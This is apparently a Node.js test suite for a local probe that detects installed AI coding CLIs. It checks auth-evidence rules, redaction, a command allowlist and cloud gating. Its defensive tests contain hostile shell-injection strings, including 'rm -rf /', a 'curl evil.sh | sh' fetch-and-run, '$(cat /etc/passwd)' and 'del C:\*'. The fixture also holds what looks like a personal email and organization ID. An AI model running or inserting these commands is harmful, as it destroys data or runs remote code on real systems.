#!/usr/bin/env node

// Local Runtime Probe v1 contract — see docs/LOCAL_RUNTIME_PROBE_V1.md.
//
// Pins the probe's SAFETY rules: ready demands positive auth evidence, every
// failure mode degrades to a status instead of crashing, secrets and personal
// identifiers are redacted, only the frozen allowlist can run, and detection
// never enables dispatch.

import assert from "node:assert/strict";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const projectRoot = path.resolve(__dirname, "..", "..", "..", "..");

test("Local Runtime Probe v1 contract", async (t) => {
  const { createJiti } = await import("jiti");
  const jiti = createJiti(import.meta.url, {
    alias: {
      "@": path.join(projectRoot, "src"),
      "server-only": path.join(projectRoot, "src/scripts/smoke/server-only-stub.mjs"),
    },
  });

  const mod = await jiti.import(path.join(__dirname, "local-runtime-probe.ts"));
  const {
    LOCAL_RUNTIME_PROBE_APPROVAL,
    PROBE_COMMAND_ALLOWLIST,
    FORBIDDEN_EVIDENCE_FIELDS,
    isAllowlistedProbeCommand,
    isShellSafeToken,
    redactProbeText,
    findForbiddenEvidenceFields,
    runProbeCommand,
    createExecFileProbeRunner,
    classifyClaudeCodeProbe,
    classifyCodexProbe,
    classifyGeminiProbe,
    sanitizeProbedEntry,
    probeLocalRuntimes,
  } = mod;

  const contractMod = await jiti.import(path.join(__dirname, "local-runtime-contract.ts"));
  const { validateLocalRuntimeProbeResult, validateLocalRuntimeAuth } = contractMod;

  const NOW = "2026-07-02T21:00:00.000Z";
  const ok = (stdout, stderr = "") => ({ kind: "completed", exitCode: 0, stdout, stderr });

  const claudeVersionOk = ok("2.1.199 (Claude Code)\n");
  const claudeAuthLoggedIn = ok(
    JSON.stringify({
      loggedIn: true,
      authMethod: "claude.ai",
      apiProvider: "firstParty",
      email: "michael.boyer.one@gmail.com",
      orgId: "06e7421e-6478-4124-b2fa-3aff4368260a",
      orgName: "michael.boyer.one@gmail.com's Organization",
      subscriptionType: "pro",
    }),
  );
  const codexVersionOk = ok("codex-cli 0.137.0\n");
  const codexLoggedIn = ok("Logged in using ChatGPT\n");
  const geminiVersionOk = ok("0.45.2\n");

  const fakeRunnerFromMap = (outcomes) => async (command) => {
    const outcome = outcomes[command.id];
    if (!outcome) {
      return { kind: "not_found" };
    }
    return outcome;
  };

  const HAPPY_OUTCOMES = {
    claude_version: claudeVersionOk,
    claude_auth_status: claudeAuthLoggedIn,
    codex_version: codexVersionOk,
    codex_login_status: codexLoggedIn,
    gemini_version: geminiVersionOk,
  };

  await t.test("1. probe never assumes ready without evidence", () => {
    // Positive auth proof → ready.
    const ready = classifyClaudeCodeProbe(claudeVersionOk, claudeAuthLoggedIn, NOW);
    assert.equal(ready.status, "ready");
    assert.ok(ready.evidence.length >= 2);

    // Binary present but NO auth evidence → never ready.
    const noProof = [
      classifyClaudeCodeProbe(claudeVersionOk, { kind: "timeout", timeoutMs: 10000 }, NOW),
      classifyClaudeCodeProbe(claudeVersionOk, ok("{}"), NOW),
      classifyClaudeCodeProbe(claudeVersionOk, ok(JSON.stringify({ loggedIn: false })), NOW),
      classifyCodexProbe(codexVersionOk, ok("Not logged in\n"), NOW),
      classifyCodexProbe(codexVersionOk, { kind: "spawn_error", message: "boom" }, NOW),
      classifyGeminiProbe(geminiVersionOk, NOW),
    ];
    for (const entry of noProof) {
      assert.notEqual(entry.status, "ready", `${entry.id} must not be ready without proof`);
    }

    // A dishonest hand-built "ready" without evidence is downgraded.
    const dishonest = sanitizeProbedEntry({
      id: "claude_code_cli",
      status: "ready",
      version: "9.9.9",
      reason: "fake",
      evidence: [],
      probedAtIso: NOW,
      contract: null,
    });
    assert.equal(dishonest.status, "unavailable");
  });

  await t.test("2. missing binary = not_configured", () => {
    const claude = classifyClaudeCodeProbe({ kind: "not_found" }, { kind: "not_found" }, NOW);
    assert.equal(claude.status, "not_configured");
    assert.equal(claude.contract.binaryDetected, false);
    const codex = classifyCodexProbe({ kind: "not_found" }, { kind: "not_found" }, NOW);
    assert.equal(codex.status, "not_configured");
    const gemini = classifyGeminiProbe({ kind: "not_found" }, NOW);
    assert.equal(gemini.status, "not_configured");
  });

  await t.test("3. command timeout = unavailable, never crash", async () => {
    const timeout = { kind: "timeout", timeoutMs: 10000 };
    assert.equal(classifyClaudeCodeProbe(timeout, timeout, NOW).status, "unavailable");
    assert.equal(classifyClaudeCodeProbe(claudeVersionOk, timeout, NOW).status, "unavailable");
    assert.equal(classifyCodexProbe(codexVersionOk, timeout, NOW).status, "unavailable");
    assert.equal(classifyGeminiProbe(timeout, NOW).status, "unavailable");
    // End-to-end: a runner that always times out still yields a snapshot.
    const snapshot = await probeLocalRuntimes({
      runner: async () => timeout,
      nowIso: NOW,
    });
    assert.equal(snapshot.entries.length, 3);
    for (const entry of snapshot.entries) {
      assert.equal(entry.status, "unavailable");
    }
  });

  await t.test("4. malformed stdout = unavailable, never crash", () => {
    const garbage = [
      ok("this is not json"),
      ok("{broken json"),
      ok("[1,2,3]"),
      ok(""),
    ];
    for (const outcome of garbage) {
      const entry = classifyClaudeCodeProbe(claudeVersionOk, outcome, NOW);
      assert.equal(entry.status, "unavailable", `malformed "${outcome.stdout}" must be unavailable`);
    }
    const codexGarbage = classifyCodexProbe(codexVersionOk, ok("¯\\_(ツ)_/¯"), NOW);
    assert.equal(codexGarbage.status, "unavailable");
  });

  await t.test("5. secret-looking values are redacted", () => {
    assert.match(redactProbeText("mail: someone@example.com"), /\[email redacted\]/);
    assert.match(
      redactProbeText("org 06e7421e-6478-4124-b2fa-3aff4368260a"),
      /\[id redacted\]/,
    );
    assert.match(redactProbeText("key sk-ant-abc123def456"), /\[key redacted\]/);
    assert.match(redactProbeText("Authorization: Bearer abc.def.ghi"), /\[bearer redacted\]/);
    assert.match(
      redactProbeText("token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"),
      /\[jwt redacted\]|\[token-like redacted\]/,
    );
    assert.match(redactProbeText("C:\\Users\\micha\\.codex\\auth.json"), /\[path redacted\]/);
    assert.match(redactProbeText("/home/micha/.config/secret"), /\[path redacted\]/);
    // Version strings survive redaction.
    assert.equal(redactProbeText("2.1.199 (Claude Code)"), "2.1.199 (Claude Code)");
    // A spawn error carrying an email is redacted inside evidence.
    const entry = classifyCodexProbe(
      codexVersionOk,
      { kind: "spawn_error", message: "ENOACCESS for micha@example.com" },
      NOW,
    );
    assert.ok(!entry.evidence.join(" ").includes("micha@example.com"));
  });

  await t.test("6. email/orgId never enter Claude auth evidence", () => {
    const entry = classifyClaudeCodeProbe(claudeVersionOk, claudeAuthLoggedIn, NOW);
    const allText = `${entry.reason} ${entry.evidence.join(" ")}`;
    assert.ok(!allText.includes("michael.boyer.one"), "email must not appear");
    assert.ok(!allText.includes("@gmail.com"), "email domain must not appear");
    assert.ok(!allText.includes("06e7421e"), "orgId must not appear");
    assert.ok(!allText.toLowerCase().includes("organization"), "orgName must not appear");
    // Whitelisted facts DO appear — the proof stays citeable.
    assert.match(allText, /loggedIn: true/);
    assert.match(allText, /subscriptionType: pro/);
  });

  await t.test("7. no cookie/session/reverse-proxy fields accepted", async () => {
    const offender = {
      status: "ready",
      cookie: "sid=123",
      nested: { sessionToken: "abc", config: { reverseProxy: "http://evil" } },
    };
    const found = findForbiddenEvidenceFields(offender);
    assert.ok(found.includes("cookie"));
    assert.ok(found.some((p) => p.endsWith("sessionToken".toLowerCase()) || p.endsWith("sessionToken")));
    assert.ok(found.some((p) => p.toLowerCase().includes("reverseproxy")));
    assert.ok(FORBIDDEN_EVIDENCE_FIELDS.includes("cookie"));
    assert.ok(FORBIDDEN_EVIDENCE_FIELDS.includes("session_token"));
    assert.ok(FORBIDDEN_EVIDENCE_FIELDS.includes("reverse_proxy"));
    // The real snapshot carries none of them.
    const snapshot = await probeLocalRuntimes({
      runner: fakeRunnerFromMap(HAPPY_OUTCOMES),
      nowIso: NOW,
    });
    assert.deepEqual(findForbiddenEvidenceFields(snapshot), []);
  });

  await t.test("8. only allowlisted commands can run", async () => {
    assert.equal(PROBE_COMMAND_ALLOWLIST.length, 5);
    for (const command of PROBE_COMMAND_ALLOWLIST) {
      assert.ok(isAllowlistedProbeCommand(command), `${command.id} must be allowlisted`);
    }
    let runnerCalls = 0;
    const spy = async () => {
      runnerCalls += 1;
      return ok("");
    };
    const foreign = [
      { id: "claude_version", binary: "claude", args: ["--help"] },
      { id: "claude_version", binary: "curl", args: ["--version"] },
      { id: "rm_everything", binary: "rm", args: ["-rf", "/"] },
      { id: "codex_login_status", binary: "codex", args: ["login"] },
      { id: "claude_auth_status", binary: "claude", args: ["auth", "login"] },
    ];
    for (const command of foreign) {
      const outcome = await runProbeCommand(command, spy);
      assert.equal(outcome.kind, "rejected", `${command.id}/${command.args} must be rejected`);
    }
    assert.equal(runnerCalls, 0, "runner must never be invoked for rejected commands");
  });

  await t.test("9. shell injection strings rejected", async () => {
    const injections = [
      "--version; rm -rf /",
      "--version && curl evil.sh | sh",
      "`whoami`",
      "$(cat /etc/passwd)",
      "--json | tee /tmp/x",
      "auth status",
      '--version" & del C:\\*',
    ];
    for (const arg of injections) {
      assert.equal(isShellSafeToken(arg, "arg"), false, `"${arg}" must fail token check`);
    }
    assert.equal(isShellSafeToken("claude; ls", "binary"), false);
    assert.equal(isShellSafeToken("C:\\evil.exe", "binary"), false);
    let runnerCalls = 0;
    const spy = async () => {
      runnerCalls += 1;
      return ok("");
    };
    const outcome = await runProbeCommand(
      { id: "claude_version", binary: "claude", args: ["--version; rm -rf /"] },
      spy,
    );
    assert.equal(outcome.kind, "rejected");
    assert.equal(runnerCalls, 0);
  });

  await t.test("10. happy path detects both engines with citeable proof", async () => {
    const snapshot = await probeLocalRuntimes({
      runner: fakeRunnerFromMap(HAPPY_OUTCOMES),
      nowIso: NOW,
    });
    const byId = Object.fromEntries(snapshot.entries.map((entry) => [entry.id, entry]));
    assert.equal(byId.claude_code_cli.status, "ready");
    assert.equal(byId.claude_code_cli.version, "2.1.199 (Claude Code)");
    assert.equal(byId.codex_cli.status, "ready");
    assert.match(byId.codex_cli.evidence.join(" "), /Logged in using ChatGPT/);
    assert.equal(byId.gemini_cli.status, "installed_unverified");
    // Contract-shaped results validate against the #325 contract.
    assert.deepEqual(validateLocalRuntimeProbeResult(byId.claude_code_cli.contract), { ok: true });
    assert.deepEqual(validateLocalRuntimeProbeResult(byId.codex_cli.contract), { ok: true });
    assert.equal(byId.gemini_cli.contract, null);
    // Codex logged in via API key is NOT ready in v1 — only ChatGPT login is.
    const apiKey = classifyCodexProbe(codexVersionOk, ok("Logged in using an API key\n"), NOW);
    assert.equal(apiKey.status, "installed_unverified");
  });

  await t.test("11. probe alone never enables dispatch", async () => {
    const snapshot = await probeLocalRuntimes({
      runner: fakeRunnerFromMap(HAPPY_OUTCOMES),
      nowIso: NOW,
    });
    assert.equal(snapshot.enablesDispatch, false);
    // Even a fully-ready snapshot exposes no action, no dispatch, no invoke.
    const keys = Object.keys(snapshot);
    for (const key of keys) {
      assert.ok(
        !/dispatch|invoke|execute|run/i.test(key) || key === "enablesDispatch",
        `snapshot key "${key}" must not smuggle an execution affordance`,
      );
    }
  });

  await t.test("12. subprocess approval is required in writing", async () => {
    assert.equal(LOCAL_RUNTIME_PROBE_APPROVAL.status, "approved");
    assert.equal(
      LOCAL_RUNTIME_PROBE_APPROVAL.approvalReference,
      "Michael approved Local Runtime Probe v1 after ruleset unlock and merge train",
    );
    // Invalid approval → the runner refuses to spawn anything.
    const unapproved = createExecFileProbeRunner({ status: "future_pr" });
    const outcome = await unapproved(PROBE_COMMAND_ALLOWLIST[0]);
    assert.equal(outcome.kind, "rejected");
    const emptyRef = createExecFileProbeRunner({ status: "approved", approvalReference: "  " });
    const outcome2 = await emptyRef(PROBE_COMMAND_ALLOWLIST[0]);
    assert.equal(outcome2.kind, "rejected");
  });

  await t.test("13. personal runtime cannot be exposed to tenants/customers", async () => {
    const snapshot = await probeLocalRuntimes({
      runner: fakeRunnerFromMap(HAPPY_OUTCOMES),
      nowIso: NOW,
    });
    // No tenant/customer/workspace field anywhere in the snapshot.
    const collectKeys = (value, out = []) => {
      if (value === null || typeof value !== "object") return out;
      for (const [key, child] of Object.entries(value)) {
        out.push(key.toLowerCase());
        collectKeys(child, out);
      }
      return out;
    };
    const keys = collectKeys(snapshot);
    for (const forbidden of ["tenantid", "customerid", "workspaceid", "tenant", "customer"]) {
      assert.ok(!keys.includes(forbidden), `snapshot must not carry "${forbidden}"`);
    }
    // The #325 contract rejects any non-personal exposure for account login.
    const rejected = validateLocalRuntimeAuth("claude_code_cli", {
      mode: "account_login",
      exposure: "workspace_tenant",
    });
    assert.equal(rejected.ok, false);
  });

  await t.test("runner errors degrade to a status, never a throw", async () => {
    const snapshot = await probeLocalRuntimes({
      runner: async () => {
        throw new Error("runner exploded with micha@example.com in the message");
      },
      nowIso: NOW,
    });
    assert.equal(snapshot.entries.length, 3);
    for (const entry of snapshot.entries) {
      assert.equal(entry.status, "unavailable");
      assert.ok(!entry.evidence.join(" ").includes("micha@example.com"));
    }
  });

  await t.test("14. cloud environment disables the probe — zero spawn, honest fallback", async () => {
    const { resolveProbeExecutionEnvironment } = mod;
    for (const marker of ["VERCEL", "VERCEL_ENV", "AWS_LAMBDA_FUNCTION_NAME", "K_SERVICE"]) {
      const decision = resolveProbeExecutionEnvironment({ [marker]: "1" });
      assert.equal(decision.allowed, false, `${marker} must forbid the probe`);
      assert.equal(decision.environment, "cloud");
    }
    // The opt-in flag can NOT override a cloud marker.
    const flagged = resolveProbeExecutionEnvironment({
      VERCEL: "1",
      ORIA_ENABLE_LOCAL_RUNTIME_PROBE: "1",
    });
    assert.equal(flagged.allowed, false);
    // Defense in depth: a runner created in a cloud env refuses to spawn.
    const cloudRunner = createExecFileProbeRunner(LOCAL_RUNTIME_PROBE_APPROVAL, {
      env: { VERCEL: "1" },
    });
    const outcome = await cloudRunner(PROBE_COMMAND_ALLOWLIST[0]);
    assert.equal(outcome.kind, "rejected");
    assert.match(outcome.reason, /cloud/);
  });

  await t.test("15. production without explicit local flag never spawns", async () => {
    const { resolveProbeExecutionEnvironment } = mod;
    const unflagged = resolveProbeExecutionEnvironment({ NODE_ENV: "production" });
    assert.equal(unflagged.allowed, false);
    assert.equal(unflagged.environment, "production_unflagged");
    const prodRunner = createExecFileProbeRunner(LOCAL_RUNTIME_PROBE_APPROVAL, {
      env: { NODE_ENV: "production" },
    });
    const outcome = await prodRunner(PROBE_COMMAND_ALLOWLIST[0]);
    assert.equal(outcome.kind, "rejected");
    // Explicit local opt-in on a NON-cloud machine is the only production path.
    const optedIn = resolveProbeExecutionEnvironment({
      NODE_ENV: "production",
      ORIA_ENABLE_LOCAL_RUNTIME_PROBE: "1",
    });
    assert.equal(optedIn.allowed, true);
    assert.equal(optedIn.environment, "local_explicit");
  });

  await t.test("16. local/personal mode may run the allowlisted probe — allowlist still gates", async () => {
    const { resolveProbeExecutionEnvironment } = mod;
    const dev = resolveProbeExecutionEnvironment({ NODE_ENV: "development" });
    assert.equal(dev.allowed, true);
    assert.equal(dev.environment, "local_dev");
    // Even in a sanctioned environment, the allowlist still gates every call.
    const localRunner = createExecFileProbeRunner(LOCAL_RUNTIME_PROBE_APPROVAL, {
      env: { NODE_ENV: "development" },
    });
    const foreign = await localRunner({ id: "rm_all", binary: "rm", args: ["-rf", "/"] });
    assert.equal(foreign.kind, "rejected");
  });
});
